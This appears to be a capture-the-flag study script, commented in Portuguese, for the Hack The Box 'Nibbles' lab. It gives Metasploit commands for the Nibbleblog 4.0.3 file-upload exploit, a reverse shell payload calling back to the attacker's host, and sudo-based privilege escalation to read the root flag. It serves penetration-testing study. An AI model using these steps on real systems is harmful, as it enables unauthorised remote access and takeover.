#!/bin/bash

################################################################################
# HTB - NIBBLES
# MÓDULO: Alternate User Method - Metasploit
#
# OBJETIVO
#
# Automatizar a exploração da vulnerabilidade de Upload Arbitrário do
# Nibbleblog 4.0.3 utilizando o módulo oficial do Metasploit Framework.
#
# Fluxo:
#
# Descobrir exploit
#        ↓
# Configurar alvo
#        ↓
# Configurar credenciais
#        ↓
# Configurar payload
#        ↓
# Executar exploit
#        ↓
# Receber Reverse Shell
#        ↓
# Escalar privilégios (mesmo método da exploração manual)
#
################################################################################


################################################################################
# Abrir o Metasploit Framework
################################################################################

msfconsole


################################################################################
# Procurar exploits relacionados ao Nibbleblog
################################################################################

search nibbleblog


################################################################################
# Exibir informações do módulo encontrado
################################################################################

info 0


################################################################################
# Selecionar o exploit
################################################################################

use exploit/multi/http/nibbleblog_file_upload

# ou

use 0


################################################################################
# Mostrar todas as opções obrigatórias do módulo
################################################################################

show options


################################################################################
# Configurar IP da máquina alvo
################################################################################

set RHOSTS IP


################################################################################
# Porta HTTP do alvo
################################################################################

set RPORT 80


################################################################################
# Usuário administrador do Nibbleblog
################################################################################

set USERNAME admin


################################################################################
# Senha encontrada durante a enumeração
################################################################################

set PASSWORD nibbles


################################################################################
# Caminho onde o CMS está instalado
#
# Exemplo:
# http://IP/nibbleblog/
################################################################################

set TARGETURI nibbleblog


################################################################################
# Configurar o IP da máquina atacante (interface tun0)
################################################################################

set LHOST LHOST


################################################################################
# Porta que ficará aguardando a Reverse Shell
################################################################################

set LPORT 4444


################################################################################
# Payload padrão do módulo
################################################################################

set PAYLOAD php/meterpreter/reverse_tcp


################################################################################
# Payload utilizado na aula
#
# Shell simples ao invés de Meterpreter
################################################################################

set PAYLOAD generic/shell_reverse_tcp


################################################################################
# Conferir novamente todas as configurações
################################################################################

show options


################################################################################
# Executar o exploit
################################################################################

exploit


################################################################################
# Confirmar acesso obtido
################################################################################

id

whoami

pwd

hostname


################################################################################
# A partir daqui seguimos exatamente o mesmo processo da exploração manual
################################################################################

sudo -l

cat /home/nibbler/user.txt

sudo /home/nibbler/personal/stuff/monitor.sh

cat /root/root.txt



